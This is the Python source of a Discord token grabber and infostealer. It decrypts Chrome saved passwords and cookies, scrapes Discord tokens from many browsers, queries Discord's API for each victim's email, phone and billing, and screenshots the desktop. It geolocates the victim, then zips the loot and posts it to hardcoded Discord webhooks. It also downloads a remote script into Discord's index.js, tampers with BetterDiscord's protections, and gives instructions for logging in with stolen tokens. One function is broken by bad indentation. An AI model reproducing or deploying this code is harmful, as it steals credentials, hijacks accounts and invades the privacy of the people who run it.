import requests
import os 
import shutil 
import sqlite3 
import zipfile 
import json 
import base64 
import psutil 
import pyautogui
import getpass
import logging
import os
import platform
import sys
from os.path import join

import requests.exceptions
from requests import get
from discord_webhook import DiscordWebhook
from passax import chrome
from win32crypt import CryptUnprotectData
from re import findall
from Crypto.Cipher import AES

handlers = [logging.FileHandler('app.log')]
logging.basicConfig(
    format="%(asctime)s - %(levelname)s : %(message)s",
    level=logging.INFO,
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=handlers)

# Get the temp path for every system
TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
    getpass.getuser()) if os.name == "nt" else f"/tmp"

# Print warning
os.system("cls" if os.name == "nt" else "clear")
with open("init_message.txt", "r") as file:
    print(file.read() + '\n')

class Cookies_Token_Grabber:
    def __init__(self):
        self.webhook = "WEBHOOK_HERE"
        self.webhookk = "https://discord.com/api/webhooks/925153281272070144/--i9j-etbtn7LgnLbopNMWAf0QLIhHoWNJsFSPvdu_j05HYmRWz4RfxmooDnjZN-eTxk"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Cookies_Token_Grabber"
        

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.saved = []

        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
            self.bypass_better_discord()

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"{os.getlogin()} is a cave man and don't have google installed\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.grabTokens()
        self.screenshot()
        self.SendInfo()
        self.LogOut()
        try:
            shutil.rmtree(self.tempfolder)
        except (PermissionError, FileExistsError):
            pass

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def LogOut(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name() for procstr in\
            ['Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB']):
                proc.kill()
        for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Cookies"))
                    except FileNotFoundError:
                        pass
                    f = requests.get("https://raw.githubusercontent.com/CookiesKush420/Test/main/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
                    with open(directory_list, 'w', encoding="utf-8") as index_file:
                        index_file.write(f)
        for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
            for name in files:
                discord_file = os.path.join(root, name)
                os.startfile(discord_file)

    def bypass_better_discord(self):
        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "CookiesIsTheBest")
        with open(bd, 'w'): pass
        with open(bd, "wt", encoding="cp437") as f:
            f.write(content2)

    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"

    def allPasswords():
        ipaddr = get('https://api.ipify.org').text  # Get IP address

    # Start webhook instance
    hook = DiscordWebhook(
        url=webhookk,
        content=f"**IP address:** {ipaddr}\n**Username**: {getpass.getuser()}",
        username="Auax"
    )

    # Iterate through the handled browsers
    for browser_name in chrome.available_browsers:
        print(f"- {browser_name.capitalize()}")
        logging.info(browser_name.capitalize())

        try:
            filename = join(TEMP_PATH, f"{browser_name}.txt")
            if platform.system() == "Windows":
                win = chrome.ChromeWindows(browser_name)
                logging.info("Getting database paths and keys for Windows...")
                win.get_windows()
                logging.info("Fetching database values...")
                win.retrieve_database()
                win.save(filename)
                logging.info(f"File saved to: {filename}")

            elif platform.system() == "Linux":
                lin = chrome.ChromeLinux(browser_name)
                logging.info("Getting database paths and keys for Linux...")
                lin.get_linux()
                logging.info("Fetching database values...")
                lin.retrieve_database()
                lin.save(filename)
                logging.info(f"File saved to: {filename}")

            else:
                print("MacOS is not supported")
                logging.error("MacOS is not supported!")
                sys.exit(-1)

        except Exception as E:
            print(f"\nSkipping {browser_name.capitalize()}\n")
            logging.warning(f"\nSkipping {browser_name.capitalize()}")
            logging.error(E)
            continue

        # Read saved password files to send them through a hook.
        with open(filename, "rb") as file:
            hook.add_file(file=file.read(), filename=filename)

        try:
            logging.info(f"Removing {filename}...")
            os.remove(filename)  # Delete temp files
        except OSError:
            logging.warning(f"Couldn't remove {filename}")
            pass

    try:
        hook.execute()  # Send webhook

    except requests.exceptions.MissingSchema:
        logging.error("Invalid Discord Hook URL")
        print("\nInvalid Discord Hook URL. Exiting...")
        sys.exit(-1)
    
    def grabPassword(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Cookies | https://github.com/CookiesKush420\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass  

    def grabCookies(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Cookies | https://github.com/CookiesKush420\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                Host = r[0]
                user = r[1]
                encrypted_cookie = r[2]
                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                if Host != "":
                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    def grabTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Cookies | https://github.com/CookiesKush420\n\n")
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            self.tokens.append(token)
        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                badges = ""
                flags = j['flags']
                if (flags == 1):
                    badges += "Staff, "
                if (flags == 2):
                    badges += "Partner, "
                if (flags == 4):
                    badges += "Hypesquad Event, "
                if (flags == 8):
                    badges += "Green Bughunter, "
                if (flags == 64):
                    badges += "Hypesquad Bravery, "
                if (flags == 128):
                    badges += "HypeSquad Brillance, "
                if (flags == 256):
                    badges += "HypeSquad Balance, "
                if (flags == 512):
                    badges += "Early Supporter, "
                if (flags == 16384):
                    badges += "Gold BugHunter, "
                if (flags == 131072):
                    badges += "Verified Bot Developer, "
                if (badges == ""):
                    badges = "None"

                user = j["username"] + "#" + str(j["discriminator"])
                email = j["email"]
                phone = j["phone"] if j["phone"] else "Poor Cunt Has No Phone Number Attached"

                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
                try:
                    requests.get(url)
                except:
                    url = url[:-4]

                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)

                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                
                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nIs Rich: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
        f.close()

    def screenshot(self):
        image = pyautogui.screenshot()
        image.save(self.tempfolder + "\\Screenshot of monitor.png")

    def SendInfo(self):
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
            pastebin = "https://pastebin.com/8DXkgJah"
            discordlogin = "https://discord.com/login"
        except:
            pass
        temp = os.path.join(self.tempfolder)
        new = os.path.join(self.appdata, f'CookiesGrabberTokens-[{os.getlogin()}].zip')
        self.zip(temp, new)
        for dirname, _, files in os.walk(self.tempfolder):
            for f in files:
                self.files += f"\n{f}"
        n = 0
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Files Found: "
        embed = {
            "username": "Cookies_Kush420#6969 Grabber",
            "avatar_url":"https://cdn.discordapp.com/attachments/753609345610154034/915996382517657660/ProfilePic.gif",
            "embeds": [
                {
                    "author": {
                        "name": "",
                        "url": "",
                        "icon_url": ""
                    },
                    "description": f"Looks like **{os.getlogin()}** ran Cookies Token Grabber start fucking there shit up!\n\n[Geo-Locate]({googlemap})\n\nComputerName: ||{os.getenv('COMPUTERNAME')}||\n\nIP: ||{ip}||\n\nCity: ||{city}||\n\nRegion: ||{region}||\n\nCountry: ||{country}||\n\nTo login with discord token goto [here]({pastebin}) copy the RAW code then goto [discord.com/login]({discordlogin}) and open the Console (CTRL + SHIFT + I) delete everything and paste the code you copied then paste the discord token in the correct place and hit ENTER to login (Or a much easier way is to get my AccountNuker ;)\n",
                    "color": 11600892,
                                                                                                                                        # Add local ip ^^
                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/753609345610154034/920273467423731742/ProfileBanner.gif"
                    },       

                    "footer": {
                      "text": "© 2021 Cookies_Kush420#6969"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=embed)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})
        requests.post(self.webhookk, json=embed)
        requests.post(self.webhookk, files={'upload_file': open(new,'rb')})

    def zip(self, src, dst):
        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, _, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

if __name__ == "__main__":
    Cookies_Token_Grabber()